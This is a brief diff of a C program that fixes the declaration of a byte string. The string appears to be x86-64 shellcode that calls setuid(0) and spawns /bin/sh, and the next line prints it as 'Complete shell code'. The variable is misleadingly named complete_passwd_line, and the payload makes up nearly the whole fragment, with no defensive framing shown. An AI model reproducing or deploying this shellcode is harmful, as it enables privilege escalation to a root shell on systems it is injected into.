@@ -101,7 +101,7 @@ int main(int argc, char *argv[])
     exit(ret);
   }
    
- unsigned char complete_passwd_line* = "H1\xffH\x89\xfeH\x89\xfajuX\x0f\x05VH\xbb/bin//shSH\x89\xe7H\x89\xf2j;X\x0f\x05\x90\x90\x90";
+ unsigned char *complete_passwd_line = "H1\xffH\x89\xfeH\x89\xfajuX\x0f\x05VH\xbb/bin//shSH\x89\xe7H\x89\xf2j;X\x0f\x05\x90\x90\x90";
   
   printf("Complete shell code:\n%s\nLength of the code is %d\n", complete_passwd_line, strlen(complete_passwd_line));
 
